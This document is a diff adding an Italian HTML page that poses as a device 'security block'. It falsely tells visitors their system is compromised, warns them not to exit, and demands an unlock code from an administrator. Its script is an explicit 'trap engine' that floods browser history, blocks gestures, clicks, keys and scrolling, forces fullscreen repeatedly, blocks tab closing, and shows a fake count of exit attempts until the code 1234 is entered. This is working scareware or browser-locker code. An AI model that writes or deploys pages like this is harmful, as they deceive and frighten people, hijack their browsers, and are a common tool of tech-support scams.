@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>Verifica Sicurezza</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; }
+  html, body {
+    width: 100%; height: 100%;
+    overflow: hidden; position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #0a0a0a;
+    font-family: 'Courier New', monospace;
+  }
+  .overlay {
+    position: fixed; inset: 0; z-index: 999999;
+    background: radial-gradient(ellipse at center, #1a0000 0%, #0a0a0a 100%);
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 24px; width: 100%; height: 100%;
+  }
+  .icon { font-size: 72px; color: #ff2222; margin-bottom: 16px; text-shadow: 0 0 40px #ff000088; }
+  h1 { font-size: 24px; color: #ff3333; margin-bottom: 8px; text-align: center; font-weight: 900; letter-spacing: 2px; }
+  .sub { font-size: 13px; color: #888; margin-bottom: 24px; text-align: center; }
+  .msg { font-size: 15px; color: #ccc; margin-bottom: 32px; text-align: center; line-height: 1.7; max-width: 360px; }
+  .msg strong { color: #ff4444; }
+  #sblocco-area { display: none; flex-direction: column; align-items: center; gap: 14px; width: 100%; max-width: 300px; }
+  #sblocco-area.show { display: flex; }
+  #codice-input {
+    background: #111; border: 2px solid #00ff41;
+    color: #00ff41; font-family: 'Courier New', monospace;
+    font-size: 36px; letter-spacing: 14px; text-align: center;
+    padding: 14px 16px; border-radius: 10px;
+    width: 100%; outline: none; caret-color: #00ff41;
+  }
+  #codice-input::placeholder { color: #335533; font-size: 14px; letter-spacing: 2px; }
+  .btn {
+    background: #ff2222; color: #fff; border: none;
+    padding: 16px 36px; font-size: 17px; font-weight: bold;
+    border-radius: 10px; cursor: pointer; width: 100%;
+    animation: pulse 1.8s infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+  .hint { font-size: 12px; color: #555; margin-top: 16px; cursor: pointer; padding: 8px; }
+  .hint:active { color: #999; }
+  .status { font-size: 13px; margin-top: 12px; min-height: 20px; }
+  .counter { font-size: 11px; color: #333; margin-top: 24px; }
+</style>
+</head>
+<body>
+
+<div class="overlay" id="trap">
+  <div class="icon">&#9888;</div>
+  <h1>BLOCCO DI SICUREZZA</h1>
+  <div class="sub">Sistema rilevato come compromesso</div>
+  <div class="msg">
+    Il dispositivo &egrave stato bloccato a causa di una minaccia rilevata.<br>
+    <strong>Non tentare di uscire.</strong><br>
+    Contatta l'amministratore per il codice di sblocco.
+  </div>
+  <button class="btn" id="btnSblocco">SBLOCCA DISPOSITIVO</button>
+  <div id="sblocco-area">
+    <input type="password" id="codice-input" maxlength="4" placeholder="----" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <div class="status" id="statusMsg"></div>
+  </div>
+  <div class="hint" id="hintLink">Pannello di ripristino</div>
+  <div class="counter" id="counter"></div>
+</div>
+
+<script>
+(function(){
+  'use strict';
+  const SECRET = '1234';
+  let sbloccato = false;
+
+  // === ELEMENTI ===
+  const trap = document.getElementById('trap');
+  const btnSblocco = document.getElementById('btnSblocco');
+  const areaSblocco = document.getElementById('sblocco-area');
+  const inputCodice = document.getElementById('codice-input');
+  const statusMsg = document.getElementById('statusMsg');
+  const hintLink = document.getElementById('hintLink');
+  const counter = document.getElementById('counter');
+
+  // === MOSTRA CAMPO SBLOCO ===
+  function mostraSblocco() {
+    areaSblocco.classList.add('show');
+    btnSblocco.style.display = 'none';
+    hintLink.style.display = 'none';
+    setTimeout(function(){ inputCodice.focus(); }, 350);
+  }
+  btnSblocco.addEventListener('click', mostraSblocco);
+  hintLink.addEventListener('click', mostraSblocco);
+
+  // === VERIFICA CODICE ===
+  inputCodice.addEventListener('input', function() {
+    const val = inputCodice.value.replace(/\D/g, '');
+    inputCodice.value = val;
+    if (val.length === 4) {
+      if (val === SECRET) {
+        statusMsg.textContent = '✔ Sblocco in corso...';
+        statusMsg.style.color = '#00ff41';
+        sbloccato = true;
+        // Rilascia tutto
+        trap.style.display = 'none';
+        // Esci da fullscreen su Android
+        try { if(document.exitFullscreen) document.exitFullscreen(); } catch(e){}
+        try { if(document.webkitExitFullscreen) document.webkitExitFullscreen(); } catch(e){}
+        // Messaggio di conferma
+        document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0a0a;color:#00ff41;font-family:monospace;font-size:24px;padding:20px;text-align:center;">✔ Sblocco completato. Puoi chiudere la pagina.</div>';
+      } else {
+        statusMsg.textContent = '✘ Codice errato. Riprova.';
+        statusMsg.style.color = '#ff3333';
+        inputCodice.value = '';
+        setTimeout(function(){ inputCodice.focus(); }, 200);
+      }
+    } else {
+      statusMsg.textContent = '';
+    }
+  });
+
+  // === TRAP ENGINE ===
+
+  // 1. History lock — impedisce back/forward
+  function lockHistory() {
+    // Pulisci e riempi la history
+    history.pushState(null, '', location.href);
+    window.addEventListener('popstate', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+      history.pushState(null, '', location.href);
+    });
+    // Push continuo ogni 200ms per sicurezza
+    setInterval(function() {
+      if (sbloccato) return;
+      history.pushState(null, '', location.href);
+    }, 200);
+  }
+
+  // 2. Blocco gesture iOS swipe-back
+  function lockGestures() {
+    // Touchstart con passive:false per poter fare preventDefault
+    document.addEventListener('touchstart', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+    }, { passive: false });
+
+    document.addEventListener('touchmove', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+    }, { passive: false });
+
+    // Blocca swipe destro (back gesture iOS)
+    document.addEventListener('touchstart', function(e) {
+      if (sbloccato) return;
+      // Se il tocco parte dal bordo sinistro (swipe-back), blocca
+      const touch = e.touches[0];
+      if (touch && touch.clientX < 40) {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+    }, { passive: false });
+
+    // Click su tutto blocca
+    document.addEventListener('click', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+      e.stopPropagation();
+    }, true);
+
+    // Context menu bloccato
+    document.addEventListener('contextmenu', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+    });
+  }
+
+  // 3. Scroll lock
+  function lockScroll() {
+    document.addEventListener('scroll', function(e) {
+      if (sbloccato) return;
+      window.scrollTo(0, 0);
+    }, { passive: false });
+
+    window.addEventListener('scroll', function(e) {
+      if (sbloccato) return;
+      window.scrollTo(0, 0);
+    }, { passive: false });
+
+    // Wheel bloccato
+    document.addEventListener('wheel', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+    }, { passive: false });
+  }
+
+  // 4. Fullscreen loop (utile su Android)
+  function lockFullscreen() {
+    setInterval(function() {
+      if (sbloccato) return;
+      if (trap.style.display === 'none') return;
+      // Su Chrome Android funziona bene
+      try {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+          const el = document.documentElement;
+          if (el.requestFullscreen) el.requestFullscreen();
+          else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
+      } catch(e) {}
+    }, 800);
+  }
+
+  // 5. beforeunload — impedisce chiusura tab su desktop, aiuta su mobile
+  function lockBeforeUnload() {
+    window.addEventListener('beforeunload', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+      e.returnValue = '';
+    });
+  }
+
+  // 6. Visibility lock — se torna in foreground, riapplica fullscreen
+  function lockVisibility() {
+    document.addEventListener('visibilitychange', function() {
+      if (sbloccato) return;
+      if (!document.hidden) {
+        // Rientra, riapplica fullscreen
+        try {
+          if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen();
+          }
+        } catch(e) {}
+        // Repush history
+        history.pushState(null, '', location.href);
+      }
+    });
+  }
+
+  // 7. Blocco tasti fisici
+  function lockKeys() {
+    document.addEventListener('keydown', function(e) {
+      if (sbloccato) return;
+      // ESC, F11, Backspace, Freccia sinistra/destra, Alt+freccia
+      const blocked = ['Escape', 'F11', 'Backspace', 'ArrowLeft', 'ArrowRight'];
+      if (blocked.includes(e.key) || e.altKey) {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+    });
+  }
+
+  // 8. Counter paranoia
+  let count = 0;
+  setInterval(function() {
+    if (sbloccato) return;
+    count++;
+    counter.textContent = 'Tentativo di uscita #' + count;
+  }, 3000);
+
+  // === AVVIA TUTTE LE TRAP ===
+  lockHistory();
+  lockGestures();
+  lockScroll();
+  lockFullscreen();
+  lockBeforeUnload();
+  lockVisibility();
+  lockKeys();
+
+  // Pulisci la history iniziale
+  history.pushState(null, '', location.href);
+
+  // Forza scroll a 0 ogni 100ms
+  setInterval(function() {
+    if (sbloccato) return;
+    window.scrollTo(0, 0);
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+  }, 100);
+
+  // Forza posizione fissa
+  document.documentElement.style.position = 'fixed';
+  document.documentElement.style.overflow = 'hidden';
+
+  console.log('[TRAP] Attivata. Codice sblocco: ' + SECRET);
+})();
+</script>
+</body>
+</html>
